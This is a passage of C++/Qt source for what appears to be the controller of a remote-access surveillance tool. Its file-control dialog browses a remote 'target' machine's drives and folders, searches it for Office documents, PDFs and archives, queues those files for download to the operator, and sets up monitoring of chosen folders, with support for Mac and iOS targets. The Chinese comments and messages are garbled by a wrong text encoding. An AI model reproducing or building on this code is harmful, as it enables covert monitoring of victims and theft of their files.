	PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();

	if ((fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
	{
		if ( UnixLike(m_tar) )
		{
			wPath = PathMergeMac(curFilePathW, item->text().toStdWString());
		}
		else
		{
			wPath = PathMergeW(curFilePathW, item->text().toStdWString());
		}

		wPath = std::wstring(L"\"") + wPath + std::wstring(L"\"");

		FrmMain->ctrConn->Send_CRP(this->m_tar, wPath, false);

	}
}

void FileCtrlDlg::onBtnAnalyzeClicked()
{
	DWORD   dwTargetId = this->m_tar->dwTargetID;

	for (int j = 0; j < ui.tbFileList->rowCount(); j++)
	{
		QTableWidgetItem* item = ui.tbFileList->item(j, 0);
		QTableWidgetItem* status = ui.tbFileList->item(j, 5);

		std::wstring wPath;
		if ( UnixLike(m_tar) )
		{
			wPath = PathMergeMac(this->curFilePathW, item->text().toStdWString());
		}
		else
		{
			wPath = PathMergeW(this->curFilePathW, item->text().toStdWString());
		}

		PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();
		if (fileBlock)
		{
			// ö�����ݿ���FileTask
			//
			if ((fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				// ���Ŀ¼��������
				//
				if (DM->CheckDirTask(dwTargetId, wPath, fileBlock))
				{
					fileBlock->bDowned = true;
					status->setText(QString::fromLocal8Bit("[������]"));

					for ( int k = 0; k < 6; ++k )
					{
						ui.tbFileList->item(j, k)->setTextColor(QColor(255, 0, 0));
					}
				}
				else
				{
					if (fileBlock->bDowned)
					{
						fileBlock->bDowned = false;
						status->setText("");
					}
				}

				if ( DM->QueryFileItemMonitored(dwTargetId, wPath) )
				{
					status->setText(QString::fromLocal8Bit("[�Ѽ��]"));

					for ( int k = 0; k < 6; ++k )
					{
						ui.tbFileList->item(j, k)->setTextColor(QColor(255, 0, 0));
					}
				}
			}
			else
			{
				// ����ļ���������
				//
				DWORD dwRet = DM->CheckFileTask(dwTargetId, wPath, fileBlock);

				switch(dwRet)
				{
				case 0:     // û�ҵ�
					break;

				case 1:     // �ҵ���
					fileBlock->bDowned = true;
					status->setText(QString::fromLocal8Bit("[������]"));
					break;

				case 2:
					fileBlock->bDowned = true;
					status->setText(QString::fromLocal8Bit("[������,��С�����仯]"));
					break;

				case 3:
					fileBlock->bDowned = true;
					status->setText(QString::fromLocal8Bit("[������,�޸�ʱ�䷢���仯]"));
				default:
					break;
				}

				if ( dwRet )
					for ( int k = 0; k < 6; ++k )
						ui.tbFileList->item(j, k)->setTextColor(QColor(50, 80, 255));
			}
		}
	}
}

void FileCtrlDlg::onBtnMonitorClicked()
{
	int count = ui.tbFileList->selectedItems().count();

	if ( 0 == count )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("��ѡ��һ���ļ����ļ���"));
		return;
	}

	if ( false == FrmMain->ctrOnlineFlag
		|| TAROFFLINE == m_tar->tarStatus )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²�����Ӽ���"));
		return;
	}

	QTableWidgetItem* item = ui.tbFileList->selectedItems()[0];
	item = ui.tbFileList->item(item->row(), 0);
	std::wstring fileName = item->text().toStdWString();
	std::wstring parentDir = ui.cmbAddress->currentText().toStdWString();

	std::wstring path;

	if ( UnixLike(m_tar) )
		path = PathMergeMac(parentDir, fileName);
	else
		path = PathMergeW(parentDir, fileName);

	PFILE_BLOCK fileInfo = (PFILE_BLOCK)(item->data(Qt::UserRole).toUInt());

	ULONG add = 1;

	if ( IsMonitored(item) )
		add = 0;

	if ( fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
	{
		if ( add == 1 )
		{
			FileMonTypeDlg dlg;
			if ( QDialog::Accepted == dlg.exec() )
			{
				std::wstring ext = dlg.GetFileMonType().toStdWString();
				FrmMain->ctrConn->Send_FMT(m_tar->dwTargetID, path, add, ext);
			}
		}
		else
		{
			FrmMain->ctrConn->Send_FMT(m_tar->dwTargetID, path, add, L"*.*");
		}
	}
	else
	{
		FrmMain->ctrConn->Send_FMT(m_tar->dwTargetID, path, add, L"*.*");
	}

	if ( add == 1 )
	{
		ui.btnMonitor->setToolTip(QString::fromLocal8Bit("ȡ������"));
		ui.btnMonitor->setIcon(QIcon(QPixmap(":/image/cancelmonitor.png")));
	}
	else
	{
		ui.btnMonitor->setToolTip(QString::fromLocal8Bit("��Ӽ���"));
		ui.btnMonitor->setIcon(QIcon(QPixmap(":/image/monitor.png")));
	}
}

void FileCtrlDlg::onBtnSearchClicked()
{
	ui.stkFileCtrl->setCurrentIndex(1);
	std::wstring path = ui.cmbAddress->currentText().toStdWString();
	ui.edtSearchPath->clear();
	if ( path != L"�����б�" )
		ui.edtSearchPath->setText(QString::fromStdWString(path));
}

void FileCtrlDlg::onBtnStartSearchClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²��ܽ����ļ�����!"));
		return;
	}

	if (this->m_tar->tarStatus == TAROFFLINE)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("���ܶ�����Ŀ�����\"����ͬ������\"!"));
		return;
	}

	std::wstring tarPathW = ui.edtSearchPath->text().toStdWString();
	if (tarPathW.length() == 0)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����·������Ϊ��!"));           
		return;
	}

	if ( ui.btnStartSearch->text() == QString::fromLocal8Bit("ȡ������") )
	{
		FrmMain->ctrConn->Send_OSF(m_tar->dwTargetID, this->dwOnlineSearchId);
		return;
	}

	// �½��������˽ṹ
	//

	SearchFilter *lpSearchFilter = new SearchFilter();

	lpSearchFilter->widName = std::wstring(L"*");
	lpSearchFilter->widType = std::wstring(L"*");
	lpSearchFilter->bNameFilter = ui.chkFileName->isChecked();
	lpSearchFilter->bTimeFilter = ui.chkFileTime->isChecked();
	lpSearchFilter->bTypeFilter = ui.chkFileType->isChecked();
	lpSearchFilter->bSizeFilter = ui.chkFileSize->isChecked();

	// �����������
	//
	if ( ui.chkFileName->isChecked() )
	{
		std::wstring widFileName = ui.edtFileName->text().toStdWString();
		if (widFileName.length() == 0)
		{
			lpSearchFilter->bNameFilter = false;
			QMessageBox::information(
				this,
				QString::fromLocal8Bit("��ʾ"),
				QString::fromLocal8Bit("������Ҫ�������ļ���!"));
			return;
			//ui.chkFileName->setChecked(false);
		}
		else
		{
			lpSearchFilter->widName = widFileName;
		}
	}

	if ( ui.chkFileTime->isChecked() )
	{

		QDate begTime = ui.dateFrom->date();
		QDate endTime = ui.dateTo->date();

		// ��ʼʱ��
		SYSTEMTIME sysBegTime, sysEndTime;
		sysBegTime.wYear = begTime.year();
		sysBegTime.wMonth = begTime.month();
		sysBegTime.wDay = begTime.day();

		// ����ʱ��
		sysEndTime.wYear = endTime.year();
		sysEndTime.wMonth = endTime.month();
		sysEndTime.wDay = endTime.day();

		if (begTime <= endTime)
		{
			sysBegTime.wHour = 0;
			sysBegTime.wMinute = 0;
			sysBegTime.wSecond = 0;
			sysBegTime.wMilliseconds = 0;

			sysEndTime.wHour = 23;
			sysEndTime.wMinute = 59;
			sysEndTime.wSecond = 59;
			sysEndTime.wMilliseconds = 99;
		}
		else
		{
			delete lpSearchFilter;
			QMessageBox::information(
				this,
				QString::fromLocal8Bit("��ʾ"),
				QString::fromLocal8Bit("������������\r\n\r\n�ļ��޸�ʱ�������һ����С����ķ�Χ"));
			return;            
		}

		FILETIME fileBegTime, fileEndTime;
		SystemTimeToFileTime(&sysBegTime, &fileBegTime);
		SystemTimeToFileTime(&sysEndTime, &fileEndTime);

		lpSearchFilter->uliBegTime.LowPart  = fileBegTime.dwLowDateTime;
		lpSearchFilter->uliBegTime.HighPart = fileBegTime.dwHighDateTime;
		lpSearchFilter->uliEndTime.LowPart  = fileEndTime.dwLowDateTime;
		lpSearchFilter->uliEndTime.HighPart = fileEndTime.dwHighDateTime;            
	}
	else
	{
		lpSearchFilter->uliBegTime.QuadPart = 0;
		lpSearchFilter->uliEndTime.QuadPart = 0;
	}

	if ( ui.chkFileType->isChecked() )
	{
		std::wstring widType = L"";

		if ( ui.chkTxt->isChecked() )
		{
			widType += std::wstring(L".txt;");
		}

		if ( ui.chkDoc->isChecked() )
		{
			widType += std::wstring(L".doc;");
		}

		if ( ui.chkPpt->isChecked() )
		{
			widType += std::wstring(L".ppt;");
		}

		if ( ui.chkXls->isChecked() )
		{
			widType += std::wstring(L".xls;");
		}

		if ( ui.chkRar->isChecked() )
		{
			widType += std::wstring(L".rar;");
		}

		if ( ui.chkPdf->isChecked() )
		{
			widType += std::wstring(L".pdf;");
		}

		if ( ui.chkOtherExt->isChecked() )
		{
			widType += ui.edtFileType->text().toStdWString();
			if ( L';' != widType[widType.length()-1] )
			{
				widType += L";";
			}
		}

		if (widType.length() == 0)
		{
			QMessageBox::information(
				this,
				QString::fromLocal8Bit("��ʾ"),
				QString::fromLocal8Bit("��ָ��Ҫ�������ļ�����"));
			return;
			//lpSearchFilter->bTypeFilter = false;
			//ui.chkFileType->setChecked(false);
		}
		else
		{
			lpSearchFilter->widType = widType;
		}
	}

	int nMinSize = 0, nMaxSize = 0;        
	if ( ui.chkFileSize->isChecked() )
	{
		if ( ui.rdSmall->isChecked() )
		{
			nMaxSize = 100 * 1024;
		}
		else if ( ui.rdMiddle->isChecked() )
		{
			nMaxSize = 1024 * 1024;
		}
		else if ( ui.rdLarge->isChecked() )
		{
			nMinSize = 1014 * 1024;
		}
		else if ( ui.rdSetFileSizeArrange->isChecked() )
		{
			bool result = false;
			nMinSize = ui.edtFileSizeFrom->text().toUInt(&result);

			if ( !result )
			{
				QMessageBox::information(
					this,
					QString::fromLocal8Bit("��ʾ"),
					QString::fromLocal8Bit("������ļ���С��Χ����Ϊ����!"));
				return;
			}

			nMinSize = nMinSize * 1024;

			if ( ui.edtFileSizeTo->text() != QString::fromLocal8Bit("����"))
			{
				nMaxSize = ui.edtFileSizeTo->text().toUInt(&result);

				if ( !result )
				{
					QMessageBox::information(
						this,
						QString::fromLocal8Bit("��ʾ"),
						QString::fromLocal8Bit("������ļ���С��Χ����Ϊ����!"));
					return;
				}

				if ( nMaxSize == 0 || nMaxSize*1024 < nMinSize )
				{
					QMessageBox::information(
						this,
						QString::fromLocal8Bit("��ʾ"),
						QString::fromLocal8Bit("������ļ���С������!"));
					return;
				}

				nMaxSize = nMaxSize * 1024;
			}
		}
	}

	lpSearchFilter->dwMinSize = nMinSize;
	lpSearchFilter->dwMaxSize = nMaxSize;

	lpSearchFilter->dwLevel = 1;
	if ( ui.chkSearchSubDir->isChecked() )
	{
		lpSearchFilter->dwLevel = 0;
	}

	if ( (!ui.chkFileName->isChecked()) && (!ui.chkFileSize->isChecked())
		&& (!ui.chkFileType->isChecked()) && (!ui.chkFileTime->isChecked()) )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("������ѡ��һ��������������!"));
		return;
	}

	if (m_tar->pluginVect[PLUGIN_ONE] == NULL)
	{
		MsgBoxErrorExW((HWND)this->winId(), L"�޷�ʹ�ý�������ͬ������\r\nû�а�װ%s", ConvertPluginIdToLangW(PLUGIN_ONE));

		return;
	}

	// ͬ������, ����OSCָ��
	//
	ClearOnlineSearchBlock();

	this->bSearching = true;
	this->dwOnlineSearchId = GetTickCount();

	FrmMain->ctrConn->Send_OSC(m_tar->dwTargetID,
		this->dwOnlineSearchId,
		GetBase64FromWide(tarPathW).c_str(),
		lpSearchFilter->dwLevel,
		lpSearchFilter);

	delete  lpSearchFilter;

	ui.btnStartSearch->setText(QString::fromLocal8Bit("ȡ������"));

}

void FileCtrlDlg::onBtnStartDownloadClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²��������ļ���������!"));
		return;
	}

	QList<QTableWidgetItem*> items = ui.tbSearchResult->selectedItems();
	int count = items.count();

	if ( count == 0 )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("�����ļ��б���ѡ��һ�������ļ���������!"));
		return;        
	}

	for (int i = 0; i < ui.tbSearchResult->rowCount(); i++)
	{
		QTableWidgetItem* item = ui.tbSearchResult->item(i, 0);

		if ( !item->isSelected())
		{
			continue;
		}

		PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();

		// .. ˵�����ƶ�ʹ���Զ�·�� [����Ĭ���Ǵ洢�ڱ�������Ŀ¼��]
		//
		std::wstring ctrPathW = L"..";

		// Ŀ��·�����������м�Դ·��
		//
		std::wstring tarPathW = ui.tbSearchResult->item(item->row(), 1)->text().toStdWString();

		/*if ( this->m_tar->m_isMac )
		{
			tarPathW = PathMergeMac(tarPathW, item->text().toStdWString());
		}*/
		if ( !UnixLike(this->m_tar) )
		{
			tarPathW = PathMergeW(tarPathW, item->text().toStdWString());
		}

		// @@@ ����Ƿ��Ѿ����������б�����
		//
		if (this->m_tar->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->m_tar, L"������� : ���� \"%s\"", tarPathW.c_str());
			this->m_tar->tarConn->Send_AFT(m_tar->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(ctrPathW).c_str(),
				GetBase64FromWide(tarPathW).c_str(),
				(ULONG)fileBlock->Size);
		}
	}
}

void FileCtrlDlg::onBtnReturnFileListClicked()
{
	ui.stkFileCtrl->setCurrentIndex(0);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����ұߴ����б�
//
void FileCtrlDlg::ShowDiskLogicDriver()
{
	DWORD driverMask = m_tar->logicDriverSet.DriveMap;
	if (0 == driverMask)
	{
		return;
	}

	FileListViewClear(ui.tbFileList);
	SwitchToDiskList();

	// �����б�״̬�½�ֹ�ϴ�
	ui.btnUpload->setEnabled(false);

	this->curFilePathW = L"�����б�";

	char driverVolume;
	for (driverVolume = 'A'; driverVolume <= 'Z'; driverVolume++)
	{
		if (driverMask & 0x1)
		{
			char tmp[4] = {'c', ':', '\\', '\0'};
			tmp[0] = driverVolume;
			std::string driver = tmp;

			ui.tbFileList->setRowCount(ui.tbFileList->rowCount()+1);
			int curRow = ui.tbFileList->rowCount()-1;

			QTableWidgetItem* child = new QTableWidgetItem;
			child->setText(driver.c_str());

			switch ( m_tar->logicDriverSet.DriveType[driverVolume - 'A'] )
			{
			case DRIVE_FIXED:
				if ( driverVolume == 'c' || driverVolume == 'C' )
					child->setIcon(QIcon(QPixmap(":/image/diskc.png")));
				else
					child->setIcon(QIcon(QPixmap(":/image/disk.png")));
				break;
			case DRIVE_CDROM:
				child->setIcon(QIcon(QPixmap(":/image/cd.png")));
				break;
			case DRIVE_REMOVABLE:
				child->setIcon(QIcon(QPixmap(":/image/usbmonitor.png")));
				break;
			}

			ui.tbFileList->setItem(curRow, 0, child);

			// ���Ӽ����� item ռλ
			for (int i = 1; i < 5; i++)
			{
				ui.tbFileList->setItem(curRow, i, new QTableWidgetItem);
			}

			// data ��Ϊ��
			ui.tbFileList->item(curRow, 0)->setData(Qt::UserRole, 0);
		}

		driverMask = driverMask >> 1;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����б�ģʽ
//
void FileCtrlDlg::SwitchToDiskList()
{
	this->bShowDiskList = true;
	ui.cmbAddress->lineEdit()->setText(QString::fromLocal8Bit("�����б�"));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �ļ��б�ģʽ
//
void FileCtrlDlg::SwitchToFileList()
{
	this->bShowDiskList = false;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ȡĿ¼����
//
void FileCtrlDlg::StartGetDirInfomation(std::wstring wPath, BOOL bOnline)
{
	// @@NOTE: Ϊ�˱�֤·����һ���ԣ���X:\\�⣬���·��������"\"
	//
	if (wPath.length() > 3)
	{
		if (L'\\' == wPath[wPath.length()-1])
		{
			wPath = wPath.substr(0, wPath.length() - 1);
		}
	}

	std::wstring iniPath = GetExePath() + L"\\setting.ini";
	int readDirInfoFromDb = ReadValueFromLocal(L"Control", L"ReadDirInfoFromDb", iniPath.c_str());

	if ( FrmMain->ctrOnlineFlag 
		&& this->m_tar->tarStatus == TARONLINE
		&& 0 == readDirInfoFromDb )
	{
		StartGetOnlineDirInfo(wPath);
	}
	else
	{
		bool bFound = UpdateDirInformation(wPath);

		if (bFound)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->m_tar, L"[Ŀ��%s(ID:%u)] �����ݿ��ѯĿ¼\"%s\"���ļ��б�",
				this->m_tar->widTargetName.c_str(),
				this->m_tar->dwTargetID,
				wPath.c_str());

		}
		else
			StartGetOnlineDirInfo(wPath);
	}

}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����Ŀ¼��Ϣ
//
bool FileCtrlDlg::UpdateDirInformation(std::wstring wPath)
{
	std::string dirTime;
	std::string dirData;

	// ���� Mac ��iphone ϵͳ , �������Ŀ¼
	QTreeWidgetItem* root = ui.trFileCtrl->topLevelItem(0);

	/*if ( (SYSTEM_MACOSX == GetSystemType(m_tar->dwOsBuildNumber) 
		|| SYSTEM_IOS == GetSystemType(m_tar->dwOsBuildNumber) )
		&& 0 == wcscmp(wPath.c_str(), L"/") )
	{
		root->takeChildren();
	}*/

	std::string base64Path = GetBase64FromWide(wPath);

	int nCount = DM->QueryLastOfflineDirInfo(this->m_tar->dwTargetID, base64Path.c_str(), dirTime, dirData);
	if (nCount == 0)
	{
		return false;
	}

	this->curFilePathW = wPath;

	InsertCmboxPath(wPath);
	if (this->bShowDiskList)
	{
		SwitchToFileList();  
		ui.btnUpload->setEnabled(true);
	}

	FileListViewClear(ui.tbFileList);
	ui.btnDownloadDir->setEnabled(false);
	ui.btnGetDirList->setEnabled(false);

	int nDirIndex = 0;
	FILETIME    local;
	std::vector<struct _FILE_BLOCK *> dirVect;
	std::string dirInfo = dirData.c_str();
	dirVect  = SplitDirString(dirInfo, "|", "*");

	std::vector<PFILE_BLOCK>::iterator i = dirVect.begin();
	for (; i != dirVect.end(); i++)
	{
		PFILE_BLOCK fileBlock = (*i);

		if ((0 == wcscmp(fileBlock->widName.c_str(), L".")) ||
			(0 == wcscmp(fileBlock->widName.c_str(), L"..")))
		{
			continue;
		}

		fileBlock->widPath = PathMergeW(wPath, fileBlock->widName);

		int row = 0;

		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			// Ŀ¼����ǰ��
			row = nDirIndex++;
			ui.tbFileList->insertRow(row);
		}
		else
		{
			row = ui.tbFileList->rowCount();
			ui.tbFileList->insertRow(row);
		}

		// �ļ���
		QTableWidgetItem* caption = new QTableWidgetItem(QString::fromStdWString(fileBlock->widName));
		caption->setData(Qt::UserRole, (unsigned int)fileBlock);

		// �޸�����
		QTableWidgetItem* lastWriteTime = new QTableWidgetItem;

		// ����
		QTableWidgetItem* type = new QTableWidgetItem;

		// ��С
		QTableWidgetItem* size = new QTableWidgetItem;
		size->setTextAlignment(Qt::AlignRight);

		// ����
		QTableWidgetItem* attribute = new QTableWidgetItem;
		attribute->setTextAlignment(Qt::AlignRight);

		// �Ƿ�������
		QTableWidgetItem* infoex = new QTableWidgetItem;
		infoex->setTextAlignment(Qt::AlignCenter);

		// Get the corresponding icon for ext
		//

		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			size->setText("");
			type->setText(QString::fromLocal8Bit("�ļ���"));

			QFileIconProvider provider;
			caption->setIcon(provider.icon(QFileIconProvider::Folder));
		}
		else
		{
			int filesize = fileBlock->Size/1024;
			if (0 == filesize )
			{
				if (0 != fileBlock->Size)
				{
					filesize = 1;
				}
			}
			size->setText(QString("%1 KB  ").arg(filesize));

			SHFILEINFOW sfi;
			LPCWSTR lpwzExt = wcsrchr(fileBlock->widName.c_str(), L'.');
			if (lpwzExt)
			{
				SHGetFileInfoW(lpwzExt,
					0,    //FILE_ATTRIBUTE_NORMAL,
					&sfi,
					sizeof(sfi),
					SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);
			}
			else
			{
				SHGetFileInfoW(L"asdf",
					0,    //FILE_ATTRIBUTE_NORMAL,
					&sfi,
					sizeof(sfi),
					SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);            
			}

			caption->setIcon(QIcon(QPixmap::fromWinHICON(sfi.hIcon)));  
			type->setText(QString::fromStdWString(std::wstring(sfi.szTypeName)));
			DestroyIcon(sfi.hIcon);
		}

		SYSTEMTIME  systime;
		FILETIME    local;

		FileTimeToLocalFileTime((FILETIME*)&fileBlock->LastWriteTime, &local);
		FileTimeToSystemTime(&local,&systime);
		char time[MAX_PATH] = {0};
		sprintf(time, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
			systime.wDay ,systime.wHour ,systime.wMinute);
		lastWriteTime->setText(QString(time));

		std::string attrs = "";

		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_HIDDEN)
			attrs = attrs + "H";
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_SYSTEM)
			attrs = attrs + "S";
		if (fileBlock->FileAttributes & FILE_ATTRIBUTE_ENCRYPTED)
			attrs = attrs + "E";

		if (!(fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY ))
		{
			if (fileBlock->FileAttributes & FILE_ATTRIBUTE_READONLY)
				attrs = attrs + "R";
			if (fileBlock->FileAttributes & FILE_ATTRIBUTE_ARCHIVE)
				attrs = attrs + "A";
		}

		attribute->setText(attrs.c_str());

		ui.tbFileList->setItem(row, 0, caption);
		ui.tbFileList->setItem(row, 1, lastWriteTime);
		ui.tbFileList->setItem(row, 2, type);
		ui.tbFileList->setItem(row, 3, size);
		ui.tbFileList->setItem(row, 4, attribute);
		ui.tbFileList->setItem(row, 5, infoex);

		// ���� mac ϵͳ����������Ŀ¼�б�
		/*if ( (SYSTEM_MACOSX == GetSystemType(m_tar->dwOsBuildNumber) 
			|| SYSTEM_IOS == GetSystemType(m_tar->dwOsBuildNumber) )
			&& 0 == wcscmp(wPath.c_str(), L"/") )
		{
			if ( fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY )
			{
				QTreeWidgetItem* item = new QTreeWidgetItem;
				QFileIconProvider provider;
				item->setIcon(0, provider.icon(QFileIconProvider::Folder));
				item->setText(0, QString::fromStdWString(fileBlock->widName));
				item->setData(0, Qt::UserRole, QString::fromStdWString(wPath + fileBlock->widName));
				root->addChild(item);
			}
		}*/

	}

	root->setExpanded(true);

	//onBtnAnalyzeClicked();

	return true;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ַ���в�����ʷ��¼
//
void FileCtrlDlg::InsertCmboxPath(std::wstring wPath)
{
	int index = ui.cmbAddress->findText(QString::fromStdWString(wPath));

	if ( -1 == index )
	{
		ui.cmbAddress->insertItem(0, QString::fromStdWString(wPath));
	}
	else
	{
		ui.cmbAddress->setCurrentIndex(index);
	}

	ui.cmbAddress->lineEdit()->setText(QString::fromStdWString(wPath));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ȡĿ¼��Ϣ ( ����״̬ )
//
void FileCtrlDlg::StartGetOnlineDirInfo(std::wstring wPath)
{
	if ( !FrmMain->ctrOnlineFlag )
		return;

	FileListViewClear(ui.tbFileList);
	InsertCmboxPath(wPath);

	//xASSERT((FrmMain->ctrConn));

	std::string base64Path = GetBase64FromWide(wPath);
	FrmMain->ctrConn->Send_DIR(this->m_tar->dwTargetID,  base64Path.c_str());

	SetTarStatusInfoExW(STATUS_INFO, this->m_tar, L"[Ŀ��%s(ID:%u)] Զ�̻�ȡĿ¼\"%s\"���ļ��б�.  ���Ժ�!",
		this->m_tar->widTargetName.c_str(),
		this->m_tar->dwTargetID,
		wPath.c_str());
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ȡĿ¼��Ϣ
//
void FileCtrlDlg::StartGetASyncDirInfo(std::wstring wPath)
{
	GetDirInfoDlg dlg(this, wPath);

	if ( QDialog::Accepted == dlg.exec() )
	{
		int level = dlg.GetLevel();

		if (this->m_tar->tarConn)
		{       
			this->m_tar->tarConn->Send_ADT(this->m_tar->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(wPath).c_str(),
				level,
				0);
		}
	}
}

void FileCtrlDlg::UpdateLirInfo()
{
	// ������������б�
	DWORD driverMask = m_tar->logicDriverSet.DriveMap;
	if (0 == driverMask)
	{
		return;
	}

	QTreeWidgetItem* disklist = ui.trFileCtrl->topLevelItem(0);
	disklist->takeChildren();

	char driverVolume;
	for (driverVolume = 'A'; driverVolume <= 'Z'; driverVolume++)
	{
		if (driverMask & 0x1)
		{
			char tmp[4] = {'c', ':', '\\', '\0'};
			tmp[0] = driverVolume;
			std::string driver = tmp;

			QTreeWidgetItem* child = new QTreeWidgetItem(disklist);

			switch ( m_tar->logicDriverSet.DriveType[driverVolume - 'A'] )
			{
			case DRIVE_FIXED:
				if ( driverVolume == 'c' || driverVolume == 'C' )
					child->setIcon(0, QIcon(QPixmap(":/image/diskc.png")));
				else
					child->setIcon(0, QIcon(QPixmap(":/image/disk.png")));
				break;
			case DRIVE_CDROM:
				child->setIcon(0, QIcon(QPixmap(":/image/cd.png")));
				break;
			case DRIVE_REMOVABLE:
				child->setIcon(0, QIcon(QPixmap(":/image/usbmonitor.png")));
				break;
			}

			child->setText(0, driver.c_str());
			child->setData(0, Qt::UserRole, driver.c_str());
		}

		driverMask = driverMask >> 1;
	}

	disklist->setExpanded(true);

	// �����ұ� table
	//ShowDiskLogicDriver();
	StartGetDirInfomation(std::wstring(L"C:\\"), false);
}

void FileCtrlDlg::ClearOnlineSearchBlock()
{
	for (int i = 0; i < ui.tbSearchResult->rowCount(); i++)
	{
		QTableWidgetItem* item = ui.tbSearchResult->item(i, 0);
		PFILE_BLOCK fileBlock = (PFILE_BLOCK)item->data(Qt::UserRole).toUInt();
		if (fileBlock)
		{
			delete fileBlock;
		}
	}

	ui.tbSearchResult->clearContents();
	ui.tbSearchResult->setRowCount(0);
}

void FileCtrlDlg::SearchFailed( MSG* msg )
{
	DWORD dwErrorId = (DWORD)msg->wParam;
	DWORD dwOsId = (DWORD)msg->lParam;

	SetTarStatusInfoExW(STATUS_INFO, this->m_tar,
		L"����ͬ���������� : %s", ConvertErrorIdToStrW(dwErrorId).c_str());

	QMessageBox::information(
		this,
		QString::fromLocal8Bit("��ʾ"),
		QString::fromLocal8Bit("����ͬ����������!"));

	ui.btnStartSearch->setText(QString::fromLocal8Bit("��ʼ����"));
}

void FileCtrlDlg::SearchFinished( MSG* msg )
{
	DWORD dwOsId = (DWORD)msg->wParam;
	DWORD dwFlag = (DWORD)msg->lParam;

	this->bSearching = false;

	if (dwOsId == this->dwOnlineSearchId)
	{
		SetTarStatusInfoExW(STATUS_INFO, this->m_tar,
			L"����ͬ������%s: �������� %d ��", dwFlag ? L"���" : L"ȡ��", ui.tbSearchResult->rowCount());

		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����ͬ���������!"));
	}

	ui.btnStartSearch->setText(QString::fromLocal8Bit("��ʼ����"));
}

void FileCtrlDlg::SearchStep( MSG* msg )
{
	DWORD       dwOsId = (DWORD)msg->wParam;
	PFILE_BLOCK fileBlock = (PFILE_BLOCK)msg->lParam;

	if (dwOsId != this->dwOnlineSearchId)
	{
		return;
	}

	QTableWidgetItem* name = new QTableWidgetItem;
	QTableWidgetItem* path = new QTableWidgetItem;
	QTableWidgetItem* size = new QTableWidgetItem;
	QTableWidgetItem* time = new QTableWidgetItem;
	QTableWidgetItem* attribute = new QTableWidgetItem;

	size->setTextAlignment(Qt::AlignRight);
	time->setTextAlignment(Qt::AlignCenter);
	attribute->setTextAlignment(Qt::AlignCenter);

	name->setText(QString::fromStdWString(fileBlock->widName));
	name->setData(Qt::UserRole, (unsigned int)fileBlock);
	path->setText(QString::fromStdWString(fileBlock->widPath));

	// Get the corresponding icon for ext
	//
	//	xASSERT(((fileBlock->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0));

	SHFILEINFOW sfi;
	LPCWSTR lpwzExt = wcsrchr(fileBlock->widName.c_str(), L'.');
	if (lpwzExt)
	{
		SHGetFileInfoW(lpwzExt,
			0,    //FILE_ATTRIBUTE_NORMAL,
			&sfi,
			sizeof(sfi),
			SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);
	}
	else
	{
		SHGetFileInfoW(L"asdf",
			0,    //FILE_ATTRIBUTE_NORMAL,
			&sfi,
			sizeof(sfi),
			SHGFI_USEFILEATTRIBUTES | SHGFI_ICON | SHGFI_TYPENAME);            
	}

	name->setIcon(QIcon(QPixmap::fromWinHICON(sfi.hIcon)));  
	DestroyIcon(sfi.hIcon);

	int filesize = fileBlock->Size/1024;
	if (0 == filesize )
	{
		if (0 != fileBlock->Size)
		{
			filesize = 1;
		}
	}

	size->setText(QString("%1 KB").arg(filesize));

	SYSTEMTIME  systime;
	FILETIME    local;

	FileTimeToLocalFileTime((FILETIME*)&fileBlock->LastWriteTime, &local);
	FileTimeToSystemTime(&local,&systime);
	char timestr[MAX_PATH] = {0};
	sprintf(timestr, "%.4d-%.2d-%.2d %.2d:%.2d", systime.wYear,systime.wMonth,
		systime.wDay ,systime.wHour ,systime.wMinute);
	time->setText(QString(timestr));

	std::string attrs = "";

